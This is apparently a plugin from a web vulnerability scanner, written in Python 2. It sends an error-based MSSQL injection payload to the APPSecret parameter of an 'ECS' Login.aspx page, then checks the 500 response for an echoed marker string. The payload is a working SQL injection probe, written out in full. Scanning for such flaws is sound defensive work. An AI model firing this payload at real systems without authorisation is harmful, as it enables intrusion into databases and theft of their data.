#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "Login.aspx?APPSecret=%27%20and%20(select%20convert(int%2cCHAR(52)%2bCHAR(67)%2bCHAR(117)%2bCHAR(102)%2bCHAR(80)%2bCHAR(87)%2bCHAR(57)%2bCHAR(107)%2bCHAR(77)%2bCHAR(84)%2bCHAR(87))%20FROM%20syscolumns)=1--"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '500' and content.find('4CufPW9kMTW')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:ECS_Login_SqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:ECS_Login_SqlInjectionScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
